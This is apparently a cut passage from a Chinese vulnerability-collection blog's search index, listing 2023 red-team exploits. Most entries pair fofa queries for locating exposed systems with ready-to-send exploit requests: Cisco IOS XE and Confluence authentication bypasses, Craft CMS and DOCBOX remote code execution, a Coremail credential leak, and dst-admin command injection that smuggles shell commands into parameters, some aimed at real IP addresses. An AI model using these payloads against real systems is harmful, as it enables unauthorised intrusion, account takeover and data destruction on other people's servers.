{\"jsonData\":{\"username\":\"guest\",\"password\":\"\",\"option\":\"add_user\",\"data\":{\"username\":\"testadm1n3\",\"password\":\"testtest\",\"permission\":{\"is_admin\":\"1\",\"view\":\"1\",\"ptz\":\"1\",\"setting\":\"1\",\"dout\":\"1\"}}}} ","date":"2023-12-08","objectID":"/cellinx-nvt-%E6%91%84%E5%83%8F%E6%9C%BA-uac.cgi-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"Cellinx NVT 摄像机 UAC.cgi 未授权访问漏洞","uri":"/cellinx-nvt-%E6%91%84%E5%83%8F%E6%9C%BA-uac.cgi-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"Cisco IOS XE CVE-2023-20198权限提升漏洞 ","date":"2023-12-08","objectID":"/cisco-ios-xe-cve-2023-20198%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"Cisco IOS XE CVE-2023-20198权限提升漏洞","uri":"/cisco-ios-xe-cve-2023-20198%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc 请参阅下面的示例请求，该请求绕过易受攻击的 IOS-XE 实例的身份验证。此 POC 创建一个名为baduser权限级别 15 的用户。让我们深入了解详细信息。 ","date":"2023-12-08","objectID":"/cisco-ios-xe-cve-2023-20198%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"Cisco IOS XE CVE-2023-20198权限提升漏洞","uri":"/cisco-ios-xe-cve-2023-20198%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"CVE-2023-20198.yaml id: CVE-2023-20198 info: name: Cisco IOS XE - Authentication Bypass author: iamnoooob,rootxharsh,pdresearch severity: critical description: | Cisco is aware of active exploitation of a previously unknown vulnerability in the web UI feature of Cisco IOS XE Software when exposed to the internet or to untrusted networks. This vulnerability allows a remote, unauthenticated attacker to create an account on an affected system with privilege level 15 access. The attacker can then use that account to gain control of the affected system. For steps to close the attack vector for this vulnerability, see the Recommendations section of this advisory. Cisco will provide updates on the status of this investigation and when a software patch is available. impact: | The CVE-2023-20198 vulnerability has a high impact on the system, allowing remote attackers to execute arbitrary code or cause a denial of service. remediation: | Apply the latest security patches or updates provided by the vendor to fix the CVE-2023-20198 vulnerability. reference: - https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-deep-dive-and-poc/ - https://arstechnica.com/security/2023/10/actively-exploited-cisco-0-day-with-maximum-10-severity-gives-full-network-control/ - https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z - https://www.cisa.gov/guidance-addressing-cisco-ios-xe-web-ui-vulnerabilities - https://www.darkreading.com/vulnerabilities-threats/critical-unpatched-cisco-zero-day-bug-active-exploit classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H cvss-score: 10 cve-id: CVE-2023-20198 epss-score: 0.9556 epss-percentile: 0.99188 cpe: cpe:2.3:o:cisco:ios_xe:*:*:*:*:*:*:*:* metadata: verified: true max-request: 1 vendor: cisco product: ios_xe shodan-query: http.html_hash:1076109428 note: this template confirms vulnerable host with limited unauthenticated command execution, this does not include admin user creation + arbitrary cmd execution. tags: cve,cve2023,kev,cisco,rce,auth-bypass variables: cmd: uname -a http: - raw: - |- POST /%2577eb%2575i_%2577sma_Http HTTP/1.1 Host: {{Hostname}} \u003c?xml version=\"1.0\"?\u003e \u003cSOAP:Envelope xmlns:SOAP=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\u003e \u003cSOAP:Header\u003e \u003cwsse:Security xmlns:wsse=\"http://schemas.xmlsoap.org/ws/2002/04/secext\"\u003e \u003cwsse:UsernameToken SOAP:mustUnderstand=\"false\"\u003e \u003cwsse:Username\u003eadmin\u003c/wsse:Username\u003e\u003cwsse:Password\u003e*****\u003c/wsse:Password\u003e\u003c/wsse:UsernameToken\u003e\u003c/wsse:Security\u003e\u003c/SOAP:Header\u003e\u003cSOAP:Body\u003e\u003crequest correlator=\"exec1\" xmlns=\"urn:cisco:wsma-exec\"\u003e \u003cexecCLI xsd=\"false\"\u003e\u003ccmd\u003e{{cmd}}\u003c/cmd\u003e\u003cdialogue\u003e\u003cexpect\u003e\u003c/expect\u003e\u003creply\u003e\u003c/reply\u003e\u003c/dialogue\u003e\u003c/execCLI\u003e\u003c/request\u003e\u003c/SOAP:Body\u003e\u003c/SOAP:Envelope\u003e matchers: - type: regex part: body regex: - XMLSchema - execLog - Cisco Systems - \u003ctext\u003e - \u003creceived\u003e condition: and extractors: - type: regex part: body group: 1 regex: - \u003ctext\u003e\\n(.*)\\[ # digest: 4a0a004730450221009b40a4249142eed7d5189033384a64024e155f76f7ca4e22d7ed4e20ea8f578702201f8018ac440528d752437de795fd4e715fa868274f6b94acea7477db80fa0c57:922c64590222798bb761d5b6d8e72950 ","date":"2023-12-08","objectID":"/cisco-ios-xe-cve-2023-20198%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"Cisco IOS XE CVE-2023-20198权限提升漏洞","uri":"/cisco-ios-xe-cve-2023-20198%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞分析 https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-deep-dive-and-poc/ https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-theory-crafting/ https://mp.weixin.qq.com/s/wH2mpYHTj6gLjMi3GgAKww ","date":"2023-12-08","objectID":"/cisco-ios-xe-cve-2023-20198%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw漏洞"],"title":"Cisco IOS XE CVE-2023-20198权限提升漏洞","uri":"/cisco-ios-xe-cve-2023-20198%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rtitle=\"一站式软件研发管理平台\" ","date":"2023-12-08","objectID":"/coding%E5%B9%B3%E5%8F%B0idna%E7%9B%AE%E5%BD%95%E5%AD%98%E5%9C%A8%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"CODING平台idna目录存在目录遍历漏洞","uri":"/coding%E5%B9%B3%E5%8F%B0idna%E7%9B%AE%E5%BD%95%E5%AD%98%E5%9C%A8%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc /ci/pypi/simple/idna/ ","date":"2023-12-08","objectID":"/coding%E5%B9%B3%E5%8F%B0idna%E7%9B%AE%E5%BD%95%E5%AD%98%E5%9C%A8%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"CODING平台idna目录存在目录遍历漏洞","uri":"/coding%E5%B9%B3%E5%8F%B0idna%E7%9B%AE%E5%BD%95%E5%AD%98%E5%9C%A8%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"Confluence 未授权提权访问漏洞 CVE-2023-22515 ","date":"2023-12-08","objectID":"/confluence-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8F%90%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"Confluence 未授权提权访问漏洞","uri":"/confluence-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8F%90%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa app=“ATLASSIAN-Confluence” ","date":"2023-12-08","objectID":"/confluence-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8F%90%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"Confluence 未授权提权访问漏洞","uri":"/confluence-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8F%90%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc yaml格式 variables: username: \"{{rand_base(10)}}\" password: \"{{rand_base(10)}}\" email: \"{{username}}@{{password}}\" http: - raw: - | GET /setup/setupadministrator-start.action HTTP/1.1 Host: {{Hostname}} - | GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=0\u0026cache{{randstr}} HTTP/1.1 Host: {{Hostname}} - | GET /setup/setupadministrator-start.action HTTP/1.1 Host: {{Hostname}} - | @timeout:20s POST /setup/setupadministrator.action HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded X-Atlassian-Token: no-check username={{to_lower(username)}}\u0026fullName=admin\u0026email={{email}}.com\u0026password={{password}}\u0026confirm={{password}}\u0026setup-next-button=Next - | POST /dologin.action HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded X-Atlassian-Token: no-check os_username={{to_lower(username)}}\u0026os_password={{password}}\u0026login=Log+in\u0026os_destination=%2Findex.action - | GET /welcome.action HTTP/1.1 Host: {{Hostname}} cookie-reuse: true redirects: true matchers: - type: dsl dsl: - contains(body_1, 'Setup is already complete') - contains(body_3, 'Please configure the system administrator account for this Confluence installation') - contains(location_5, '/index.action') - status_code_5 == 302 - contains(body_6, 'Administration') condition: and ","date":"2023-12-08","objectID":"/confluence-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8F%90%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"Confluence 未授权提权访问漏洞","uri":"/confluence-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8F%90%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"Confluence身份认证绕过(CVE-2023-22518) 未经身份验证的远程攻击者通过构造恶意请求可在一定程度绕过目标系统身份验证，并通过后台接口获得接管服务器的权限，最终可实现远程代码执行，由于攻击者无法泄露任何系统数据，因此不会影响机密性；但该漏洞利用会导致 Confluence 数据清空，对数据完整性产生不可逆的影响。请受影响用户尽快采取措施进行防护。 ","date":"2023-12-08","objectID":"/confluence%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87cve-2023-22518/:1:0","tags":["2023hw漏洞"],"title":"Confluence身份认证绕过(CVE-2023-22518)","uri":"/confluence%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87cve-2023-22518/"},{"categories":["2023hw漏洞"],"content":"影响版本 Atlassian confluence \u003c 7.19.16 Atlassian confluence \u003c 8.3.4 Atlassian confluence \u003c 8.4.4 Atlassian confluence \u003c 8.5.3 Atlassian confluence \u003c 8.6.1 ","date":"2023-12-08","objectID":"/confluence%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87cve-2023-22518/:2:0","tags":["2023hw漏洞"],"title":"Confluence身份认证绕过(CVE-2023-22518)","uri":"/confluence%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87cve-2023-22518/"},{"categories":["2023hw漏洞"],"content":"CVE-2023-22518.yaml id: CVE-2023-22518 info: name: Atlassian Confluence Server - Improper Authorization author: iamnoooob,rootxharsh,pdresearch severity: critical description: | All versions of Confluence Data Center and Server are affected by this unexploited vulnerability. There is no impact to confidentiality as an attacker cannot exfiltrate any instance data. Atlassian Cloud sites are not affected by this vulnerability. If your Confluence site is accessed via an atlassian.net domain, it is hosted by Atlassian and is not vulnerable to this issue. reference: - https://confluence.atlassian.com/pages/viewpage.action?pageId=1311473907 - https://blog.projectdiscovery.io/atlassian-confluence-auth-bypass/ - https://jira.atlassian.com/browse/CONFSERVER-93142 - https://nvd.nist.gov/vuln/detail/CVE-2023-22518 classification: cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H cvss-score: 9.1 cve-id: CVE-2023-22518 epss-score: 0.00043 epss-percentile: 0.0726 metadata: verified: true max-request: 1 vendor: atlassian product: confluence_data_center shodan-query: http.component:\"Atlassian Confluence\" note: this template attempts to validate the vulnerability by uploading an invalid (empty) zip file. This is a safe method for checking vulnerability and will not cause data loss or database reset. In real attack scenarios, a malicious file could potentially be used causing more severe impacts. tags: cve,cve2023,atlassian,confluence,rce,unauth http: - raw: - | POST /json/setup-restore.action HTTP/1.1 Host: {{Hostname}} Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT3yekvo0rGaL9QR7 ------WebKitFormBoundaryT3yekvo0rGaL9QR7 Content-Disposition: form-data; name=\"buildIndex\" true ------WebKitFormBoundaryT3yekvo0rGaL9QR7 Content-Disposition: form-data; name=\"file\";filename=\"{{randstr}}.zip\" {{randstr}} ------WebKitFormBoundaryT3yekvo0rGaL9QR7 Content-Disposition: form-data; name=\"edit\" Upload and import ------WebKitFormBoundaryT3yekvo0rGaL9QR7-- matchers: - type: dsl dsl: - \"status_code == 200\" - \"contains_all(body,'The zip file did not contain an entry', 'exportDescriptor.properties')\" condition: and # digest: 4a0a00473045022074611cf8360af402eab4224903570e50569a0a115df2b5cbe092341e10b75748022100ea16e1b28f542368626bb141260ba18a0359147d652f99f0b26b4e89c79bf7dd:922c64590222798bb761d5b6d8e72950 ","date":"2023-12-08","objectID":"/confluence%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87cve-2023-22518/:3:0","tags":["2023hw漏洞"],"title":"Confluence身份认证绕过(CVE-2023-22518)","uri":"/confluence%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87cve-2023-22518/"},{"categories":["2023hw漏洞"],"content":"漏洞分析 https://xz.aliyun.com/t/12961 ","date":"2023-12-08","objectID":"/confluence%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87cve-2023-22518/:4:0","tags":["2023hw漏洞"],"title":"Confluence身份认证绕过(CVE-2023-22518)","uri":"/confluence%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87cve-2023-22518/"},{"categories":["2023hw"],"content":"```\r/coremail/common/assets/:/:/:/:/:/:/s? biz=Mzl3MTk4NTcyNw==\u0026mid=2247485877\u0026idx=1\u0026sn=7e5f77db320ccf9013c0b7aa7262 6688chksm=eb3834e5dc4fbdf3a9529734de7e6958e1b7efabecd1c1b340c53c80299ff5c688b f6adaed61\u0026scene=2 ","date":"2023-12-08","objectID":"/coremail-%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%AF%86/:0:0","tags":["2023hw"],"title":"Coremail 邮件系统未授权访问获取管理员账密","uri":"/coremail-%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%AF%86/"},{"categories":["2023hw漏洞"],"content":"Coremail邮件系统未授权访问获取管理员账密 /coremail/common/assets/;/;/;/;/;/;/s?__biz=MzI3MTk4NTcyNw==\u0026mid=2247485877\u0026idx=1\u0026sn=7e5f77db320ccf9013c0b7aa72626e68\u0026chksm=eb3834e5dc4fbdf3a9529734de7e6958e1b7efabecd1c1b340c53c80299ff5c688bf6adaed61\u0026scene=2 ","date":"2023-12-08","objectID":"/coremail%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%AF%86/:1:0","tags":["2023hw漏洞"],"title":"Coremail邮件系统未授权访问获取管理员账密","uri":"/coremail%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%AF%86/"},{"categories":["2023hw漏洞"],"content":"Craft CMS远程代码执行漏洞CVE-2023-41892 ","date":"2023-12-08","objectID":"/craft-cms%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-41892/:1:0","tags":["2023hw漏洞"],"title":"Craft CMS远程代码执行漏洞CVE-2023-41892","uri":"/craft-cms%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-41892/"},{"categories":["2023hw漏洞"],"content":"影响版本 Craft CMS \u003e= 4.0.0-RC1 Craft CMS \u003c= 4.4.14 ","date":"2023-12-08","objectID":"/craft-cms%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-41892/:2:0","tags":["2023hw漏洞"],"title":"Craft CMS远程代码执行漏洞CVE-2023-41892","uri":"/craft-cms%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-41892/"},{"categories":["2023hw漏洞"],"content":"exp POST /index.php HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded action=conditions/render\u0026test[userCondition]=craft\\elements\\conditions\\users\\UserCondition\u0026config={\"name\":\"test[userCondition]\",\"as xyz\":{\"class\":\"\\\\GuzzleHttp\\\\Psr7\\\\FnStream\", \"__construct()\": [{\"close\":null}],\"_fn_close\":\"phpinfo\"}} ","date":"2023-12-08","objectID":"/craft-cms%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-41892/:3:0","tags":["2023hw漏洞"],"title":"Craft CMS远程代码执行漏洞CVE-2023-41892","uri":"/craft-cms%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-41892/"},{"categories":["2023hw漏洞"],"content":"CVE-2023-4357-Chrome-XXE漏洞 CVE-2023-4357-Chrome-XXE Chrome XXE 漏洞 POC 实现对访客者本地文件读取 ","date":"2023-12-08","objectID":"/cve-2023-4357-chrome-xxe%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"CVE-2023-4357-Chrome-XXE漏洞","uri":"/cve-2023-4357-chrome-xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"影响版本 Chrome 版本 \u003c 116.0.5845.96 Chromium 版本 \u003c 116.0.5845.96 Electron 版本 \u003c 26.1.0 ","date":"2023-12-08","objectID":"/cve-2023-4357-chrome-xxe%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"CVE-2023-4357-Chrome-XXE漏洞","uri":"/cve-2023-4357-chrome-xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE ","date":"2023-12-08","objectID":"/cve-2023-4357-chrome-xxe%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"CVE-2023-4357-Chrome-XXE漏洞","uri":"/cve-2023-4357-chrome-xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"docbox.webapp\" ","date":"2023-12-08","objectID":"/docbox-dynamiccontent.properties.xhtml-%E6%96%87%E4%BB%B6-cmd-%E5%8F%82%E6%95%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"DOCBOX dynamiccontent.properties.xhtml 文件 cmd 参数远程代码执行漏洞","uri":"/docbox-dynamiccontent.properties.xhtml-%E6%96%87%E4%BB%B6-cmd-%E5%8F%82%E6%95%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc POST /docbox.webapp/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1 Host: 81.169.200.109:8080 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 1567 pfdrt=sc\u0026ln=primefaces\u0026pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D\u0026cmd=whoami ","date":"2023-12-08","objectID":"/docbox-dynamiccontent.properties.xhtml-%E6%96%87%E4%BB%B6-cmd-%E5%8F%82%E6%95%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"DOCBOX dynamiccontent.properties.xhtml 文件 cmd 参数远程代码执行漏洞","uri":"/docbox-dynamiccontent.properties.xhtml-%E6%96%87%E4%BB%B6-cmd-%E5%8F%82%E6%95%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rPOST /admini/html.php HTTP/1.1 Host: 112.74.114.21 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 75 m=/../../../admini/views/system/lang/editTags.php\u0026tags=1);echo md5(123);// ","date":"2023-12-08","objectID":"/doccms-html.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/:0:0","tags":["2023hw"],"title":"Doccms html.php任意文件包含","uri":"/doccms-html.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"categories":["2023hw"],"content":"## fofa\rtitle==\"饥荒管理后台\" ","date":"2023-12-08","objectID":"/dst-admin-cavesconsole-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-0646/:0:0","tags":["2023hw"],"title":"dst-admin cavesConsole 远程命令执行漏洞（CVE-2023-0646）","uri":"/dst-admin-cavesconsole-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-0646/"},{"categories":["2023hw"],"content":"poc POST /home/cavesConsole HTTP/1.1 Host: 101.35.120.58:8080 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/json Cookie: JSESSIONID=7b0bfc18-03ff-40ec-95aa-5d520734fe18;rememberMe=deleteMe; Accept-Encoding: gzip Content-Length: 31 {\"command\":\"\\\"\u0026ping dnslog;\\\"\"} GET /home/kickPlayer?userId=%5C%22)%5Cn%22%26ping+dnslog%26screen%20-S%20%22DST_CAVES%22%20-p%200%20-X%20stuff%20%22TheNet%3AKick(%5C%22 HTTP/1.1 Host: 101.35.120.58:8080 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Cookie: JSESSIONID=5c2ca195-7aa2-4be2-9383-1287e2976132;rememberMe=deleteMe; Accept-Encoding: gzip ","date":"2023-12-08","objectID":"/dst-admin-cavesconsole-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-0646/:1:0","tags":["2023hw"],"title":"dst-admin cavesConsole 远程命令执行漏洞（CVE-2023-0646）","uri":"/dst-admin-cavesconsole-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-0646/"},{"categories":["2023hw"],"content":"## fofa\rtitle==\"饥荒管理后台\" ","date":"2023-12-08","objectID":"/dst-admin-%E9%A5%A5%E8%8D%92%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0-sendbroadcast-%E6%96%87%E4%BB%B6-message-%E5%8F%82%E6%95%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-0649/:0:0","tags":["2023hw"],"title":"dst-admin 饥荒管理后台 sendBroadcast 文件 message 参数远程命令执行漏洞（CVE-2023-0649）","uri":"/dst-admin-%E9%A5%A5%E8%8D%92%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0-sendbroadcast-%E6%96%87%E4%BB%B6-message-%E5%8F%82%E6%95%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-0649/"},{"categories":["2023hw"],"content":"poc GET /home/sendBroadcast?message=%5C%22)%5Cn%22%26ping+dnslog%26screen%20-S%20%22DST_CAVES%22%20-p%200%20-X%20stuff%20%22TheNet%3AKick(%5C%22 HTTP/1.1 Host: 101.34.250.180:8888 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) 